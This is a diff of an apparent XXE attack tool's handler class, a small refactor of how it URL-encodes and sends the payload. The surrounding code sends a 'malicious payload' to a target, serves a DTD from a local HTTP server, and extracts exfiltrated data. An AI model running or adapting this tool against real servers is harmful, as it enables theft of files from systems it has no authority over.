@@ -4,7 +4,7 @@ from abc import ABC
 from abc import abstractmethod
 from typing import cast
 from typing import Optional
-from urllib.parse import quote_plus
+from urllib.parse import quote
 
 from xeely import console
 from xeely import RESOURCES_PATH
@@ -57,7 +57,7 @@ class AbstractXXEAttackHandler(ABC):
 
     def _send_request(self, data: str) -> HTTPResponse:
         if self._payload_prefix != "":
-            data = quote_plus(data)
+            data = quote(data)
 
         return HTTPClient.send_post_request(
             url=self._target_url, data=f"{self._payload_prefix}{data}"
@@ -80,6 +80,7 @@ class AbstractXXEAttackHandler(ABC):
         )
 
         console.print_info("Sending malicious payload to target machine")
+        payload = payload_generator.generate_payload()
         if payload_generator.does_payload_requires_to_expose_dtd_file():
             dtd_file_path = RESOURCES_PATH / payload_generator.get_dtd_file_name()
             with open(dtd_file_path, "w") as file:
@@ -89,14 +90,11 @@ class AbstractXXEAttackHandler(ABC):
             lport = cast(HTTPServerParams, self._http_server_params).get_port()
 
             with run_http_server(lhost=lhost, lport=lport):
-                payload = payload_generator.generate_payload()
                 http_response = self._send_request(payload)
 
             os.remove(dtd_file_path)
         else:
-            http_response = HTTPClient.send_post_request(
-                url=self._target_url, data=payload_generator.generate_payload()
-            )
+            http_response = self._send_request(payload)
 
         exfiltrated_data = self._get_exfiltrated_data(http_response=http_response.body)
 
